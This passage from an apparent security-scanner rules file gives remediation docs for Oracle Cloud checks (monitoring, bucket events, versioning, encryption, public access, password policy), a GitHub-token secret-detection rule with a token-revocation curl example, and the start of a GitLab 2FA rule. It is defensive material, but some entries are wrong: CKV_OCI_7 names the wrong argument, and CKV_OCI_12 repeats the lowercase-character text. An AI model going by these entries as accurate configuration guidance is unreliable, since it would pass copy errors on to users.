</ol>
<p>FMI : <a href="https://docs.cloud.oracle.com/en-us/iaas/Content/Compute/Tasks/enablingmonitoring.htm#ExistingEnabling" target="_self">https://docs.cloud.oracle.com/en-us/iaas/Content/Compute/Tasks/enablingmonitoring.htm#ExistingEnabling</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: oci_core_instance</li>
<li><strong>Arguments</strong>: agent_config.is_monitoring_disabled </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "oci_core_instance" "pass" {
  ...
  agent_config {
    ...
    is_monitoring_disabled   = false
   ....
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-oci-compute-instance-has-monitoring-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-oci-compute-instance-has-monitoring-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-oci-compute-instance-has-monitoring-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_7</key>
    <name>Ensure OCI Object Storage bucket can emit object events</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-object-storage-bucket-does-not-emit-object-events"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-object-storage-bucket-does-not-emit-object-events"></div>OCI Object Storage bucket does not emit object events</div><a aria-label="Skip link to OCI Object Storage bucket does not emit object events" class="heading-anchor-icon fa fa-anchor" href="#oci-object-storage-bucket-does-not-emit-object-events"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies the OCI Object Storage buckets that are disabled with object events emission. Monitoring and alerting on object events of bucket objects will help in identifying changes bucket objects. It is recommended that buckets should be enabled to emit object events.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-console"></div>OCI Console</div><a aria-label="Skip link to OCI Console" class="heading-anchor-icon fa fa-anchor" href="#oci-console"></a></h2>
<ol>
<li>Login to the OCI Console</li>
<li>Type the resource reported in the alert into the Search box at the top of the Console.</li>
<li>Click the resource reported in the alert from the Resources submenu</li>
<li>Next to Emit Object Events, click Edit.</li>
<li>In the dialog box, select  EMIT OBJECT EVENTS (to enable).</li>
<li>Click Save Changes.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: oci_objectstorage_bucket</li>
<li><strong>Arguments</strong>: agent_config.is_monitoring_disabled </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "oci_objectstorage_bucket" "pass" {
  ...
  object_events_enabled = true
...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-oci-object-storage-bucket-can-emit-object-events' target='_blank'> https://docs.bridgecrew.io/docs/ensure-oci-object-storage-bucket-can-emit-object-events</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-oci-object-storage-bucket-can-emit-object-events' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_8</key>
    <name>Ensure OCI Object Storage has versioning enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-object-storage-bucket-has-object-versioning-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-object-storage-bucket-has-object-versioning-disabled"></div>OCI Object Storage Bucket has object Versioning disabled</div><a aria-label="Skip link to OCI Object Storage Bucket has object Versioning disabled" class="heading-anchor-icon fa fa-anchor" href="#oci-object-storage-bucket-has-object-versioning-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies the OCI Object Storage buckets that are not configured with a Object Versioning. It is recommended that Object Storage buckets should be configured with Object Versioning to minimize data loss because of inadvertent deletes by an authorized user or malicious deletes.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-console"></div>OCI Console</div><a aria-label="Skip link to OCI Console" class="heading-anchor-icon fa fa-anchor" href="#oci-console"></a></h2>
<ol>
<li>Login to the OCI Console</li>
<li>Type the resource reported in the alert into the Search box at the top of the Console.</li>
<li>Click the resource reported in the alert from the Resources submenu</li>
<li>Next to Object Versioning, click Edit.</li>
<li>In the dialog box, Clink Enable Versioing (to enable).</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: oci_objectstorage_bucket</li>
<li><strong>Arguments</strong>: versioning</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "oci_objectstorage_bucket" "pass" {
  ...

  versioning = "Enabled"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-oci-object-storage-has-versioning-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-oci-object-storage-has-versioning-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-oci-object-storage-has-versioning-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_9</key>
    <name>Ensure OCI Object Storage is encrypted with Customer Managed Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-object-storage-bucket-is-not-encrypted-with-a-customer-managed-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-object-storage-bucket-is-not-encrypted-with-a-customer-managed-key-cmk"></div>OCI Object Storage Bucket is not encrypted with a Customer Managed Key (CMK)</div><a aria-label="Skip link to OCI Object Storage Bucket is not encrypted with a Customer Managed Key (CMK)" class="heading-anchor-icon fa fa-anchor" href="#oci-object-storage-bucket-is-not-encrypted-with-a-customer-managed-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies the OCI Object Storage buckets that are not encrypted with a Customer Managed Key (CMK). It is recommended that Object Storage buckets should be encrypted with a Customer Managed Key (CMK), using  Customer Managed Key (CMK), provides an additional level of security on your data by allowing you to manage your own encryption key lifecycle management for the bucket.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-console"></div>OCI Console</div><a aria-label="Skip link to OCI Console" class="heading-anchor-icon fa fa-anchor" href="#oci-console"></a></h2>
<ol>
<li>Login to the OCI Console</li>
<li>Type the resource reported in the alert into the Search box at the top of the Console.</li>
<li>Click the resource reported in the alert from the Resources submenu</li>
<li>Click Assign next to Encryption Key: Oracle managed key.</li>
<li>Select a Vault from the appropriate compartment</li>
<li>Select a Master Encryption Key</li>
<li>Click Assign</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: oci_objectstorage_bucke</li>
<li><strong>Arguments</strong>: kms_key_id </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "oci_objectstorage_bucket" "pass" {
  ...
  kms_key_id            = var.oci_kms_key.id
  ...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-oci-object-storage-is-encrypted-with-customer-managed-key' target='_blank'> https://docs.bridgecrew.io/docs/ensure-oci-object-storage-is-encrypted-with-customer-managed-key</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-oci-object-storage-is-encrypted-with-customer-managed-key' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_10</key>
    <name>Ensure OCI Object Storage is not Public</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-object-storage-bucket-is-publicly-accessible"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-object-storage-bucket-is-publicly-accessible"></div>OCI Object Storage bucket is publicly accessible</div><a aria-label="Skip link to OCI Object Storage bucket is publicly accessible" class="heading-anchor-icon fa fa-anchor" href="#oci-object-storage-bucket-is-publicly-accessible"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies the OCI Object Storage buckets that are publicly accessible. Monitoring and alerting on publicly accessible buckets will help in identifying changes to the security posture and thus reduces risk for sensitive data being leaked. It is recommended that no bucket be publicly accessible.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-console"></div>OCI Console</div><a aria-label="Skip link to OCI Console" class="heading-anchor-icon fa fa-anchor" href="#oci-console"></a></h2>
<ol>
<li>Login to the OCI Console</li>
<li>Type the resource reported in the alert into the Search box at the top of the Console.</li>
<li>Click the resource reported in the alert from the Resources submenu</li>
<li>Click on the Edit Visibility</li>
<li>Select Visibility as Private</li>
<li>Click Save Changes</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: oci_objectstorage_bucket</li>
<li><strong>Arguments</strong>: access_type</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "oci_objectstorage_bucket" "pass2" {
...
  access_type           = "NoPublicAccess"
...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-oci-object-storage-is-not-public' target='_blank'> https://docs.bridgecrew.io/docs/ensure-oci-object-storage-is-not-public</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-oci-object-storage-is-not-public' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_11</key>
    <name>Ensure OCI IAM password policy contains lowercase characters</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-iam-password-policy-for-local-non-federated-users-does-not-have-a-lowercase-character"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-iam-password-policy-for-local-non-federated-users-does-not-have-a-lowercase-character"></div>OCI IAM password policy for local (non-federated) users does not have a lowercase character</div><a aria-label="Skip link to OCI IAM password policy for local (non-federated) users does not have a lowercase character" class="heading-anchor-icon fa fa-anchor" href="#oci-iam-password-policy-for-local-non-federated-users-does-not-have-a-lowercase-character"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Oracle Cloud Infrastructure(OCI) accounts that do not have a lowercase character in the password policy for local (non-federated) users. As a security best practice, configure a strong password policy for secure access to the OCI console.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-console"></div>OCI Console</div><a aria-label="Skip link to OCI Console" class="heading-anchor-icon fa fa-anchor" href="#oci-console"></a></h2>
<ol>
<li>Login to the OCI Console Page: <a href="https://console.ap-mumbai-1.oraclecloud.com/" target="_self">https://console.ap-mumbai-1.oraclecloud.com/</a></li>
<li>Go to Identity in the Services menu.</li>
<li>Select Authentication Settings from the Identity menu.<br/>
4.Click Edit Authentication Settings in the middle of the page.<br/>
5.Ensure the checkbox is selected next to MUST CONTAIN AT LEAST 1 LOWERCASE CHARACTER.<br/>
Note : The console URL is region specific, your tenancy might have a different home region and thus console URL.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: oci_identity_authentication_policy</li>
<li><strong>Arguments</strong>: password_policy.is_lowercase_characters_required</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "oci_identity_authentication_policy" "pass" {
...

  password_policy {
    is_lowercase_characters_required = true
...
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/oci-iam-password-policy-must-contain-lower-case' target='_blank'> https://docs.bridgecrew.io/docs/oci-iam-password-policy-must-contain-lower-case</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/oci-iam-password-policy-must-contain-lower-case' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_12</key>
    <name>Ensure OCI IAM password policy contains numeric characters</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-iam-password-policy-for-local-non-federated-users-does-not-have-a-number"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-iam-password-policy-for-local-non-federated-users-does-not-have-a-number"></div>OCI IAM password policy for local (non-federated) users does not have a number</div><a aria-label="Skip link to OCI IAM password policy for local (non-federated) users does not have a number" class="heading-anchor-icon fa fa-anchor" href="#oci-iam-password-policy-for-local-non-federated-users-does-not-have-a-number"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Oracle Cloud Infrastructure(OCI) accounts that do not have a lowercase character in the password policy for local (non-federated) users. As a security best practice, configure a strong password policy for secure access to the OCI console.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-console"></div>OCI Console</div><a aria-label="Skip link to OCI Console" class="heading-anchor-icon fa fa-anchor" href="#oci-console"></a></h2>
<ol>
<li>Login to the OCI Console Page: <a href="https://console.ap-mumbai-1.oraclecloud.com/" target="_self">https://console.ap-mumbai-1.oraclecloud.com/</a></li>
<li>Go to Identity in the Services menu.</li>
<li>Select Authentication Settings from the Identity menu.<br/>
4.Click Edit Authentication Settings in the middle of the page.<br/>
5.Ensure the checkbox is selected next to MUST CONTAIN AT LEAST 1 LOWERCASE CHARACTER.<br/>
Note : The console URL is region specific, your tenancy might have a different home region and thus console URL.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: oci_identity_authentication_policy</li>
<li><strong>Arguments</strong>: password_policy.is_numeric_characters_required</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "oci_identity_authentication_policy" "pass" {
...
  password_policy {
    ...
    is_numeric_characters_required   = true
    ...
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/oci-iam-password-policy-must-contain-numeric-characters' target='_blank'> https://docs.bridgecrew.io/docs/oci-iam-password-policy-must-contain-numeric-characters</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/oci-iam-password-policy-must-contain-numeric-characters' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_43</key>
    <name>GitHub Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-token"></div>GitHub Token</div><a aria-label="Skip link to GitHub Token" class="heading-anchor-icon fa fa-anchor" href="#github-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="github-personal-access-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-personal-access-token"></div>GitHub Personal Access Token</div><a aria-label="Skip link to GitHub Personal Access Token" class="heading-anchor-icon fa fa-anchor" href="#github-personal-access-token"></a></h2>
<p>Personal access tokens (PATs) are an alternative to using passwords for authentication to GitHub when using the GitHub API or the command line. If you want to use a PAT to access resources owned by an organization that uses SAML SSO, you must authorize the PAT. </p>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="github-oauth-access-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-o-auth-access-token"></div>GitHub OAuth Access Token</div><a aria-label="Skip link to GitHub OAuth Access Token" class="heading-anchor-icon fa fa-anchor" href="#github-oauth-access-token"></a></h2>
<p>GitHub's OAuth implementation supports the standard authorization code grant type and the OAuth 2.0 Device Authorization Grant for apps that don't have access to a web browser. If you want to skip authorizing your app in the standard way, such as when testing your app, you can use the non-web application flow. To authorize your OAuth app, consider which authorization flow best fits your app.</p>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="github-app-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-app-token"></div>GitHub App Token</div><a aria-label="Skip link to GitHub App Token" class="heading-anchor-icon fa fa-anchor" href="#github-app-token"></a></h2>
<p>After you create a GitHub App, you'll need to generate one or more private keys. You'll use the private key to sign access token requests. You can create multiple private keys and rotate them to prevent downtime if a key is compromised or lost.</p>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="github-refresh-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-refresh-token"></div>GitHub Refresh Token</div><a aria-label="Skip link to GitHub Refresh Token" class="heading-anchor-icon fa fa-anchor" href="#github-refresh-token"></a></h2>
<p>To enforce regular token rotation and reduce the impact of a compromised token, you can configure your GitHub App to use expiring user access tokens.  Expiring user tokens expire after 8 hours. When you receive a new user-to-server access token, the response will also contain a refresh token, which can be exchanged for a new user token and refresh token. Refresh tokens are valid for 6 months.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="github-app-token-1"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-app-token"></div>GitHub App Token</div><a aria-label="Skip link to GitHub App Token" class="heading-anchor-icon fa fa-anchor" href="#github-app-token-1"></a></h2>
<ol>
<li>In the upper-right corner of any page, click your profile photo, then click Settings.</li>
<li>In the "Integrations" section of the sidebar, click  Applications.</li>
<li>Click the Authorized OAuth Apps tab.</li>
<li>Review the tokens that have access to your account. For those that you don't recognize or that are out-of-date, click , then click Revoke. To revoke all tokens, click Revoke all.</li>
</ol>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">curl \
  -X DELETE \
  -H "Accept: application/vnd.github+json" \ 
  -H "Authorization: Bearer &lt;YOUR-TOKEN&gt;" \
  https://api.github.com/applications/Iv1.8a61f9b3a7aba766/token \
  -d '{"access_token":"e72e16c7e42f292c6912e7710c838347ae178b4a"}'
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_43' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_43</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_43' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GITLAB_2</key>
    <name>Ensure all Gitlab groups require two factor authentication</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gitlab-organization-has-groups-with-no-two-factor-authentication-configured"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gitlab-organization-has-groups-with-no-two-factor-authentication-configured"></div>Gitlab organization has groups with no two factor authentication configured</div><a aria-label="Skip link to Gitlab organization has groups with no two factor authentication configured" class="heading-anchor-icon fa fa-anchor" href="#gitlab-organization-has-groups-with-no-two-factor-authentication-configured"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In GitLab, Two-factor authentication (2FA) provides an additional level of security to user accounts. When enabled, users are prompted for a code generated by an application in addition to supplying their username and password to sign in.</p>
<p>Enable 2FA for all users:</p>
<ol>
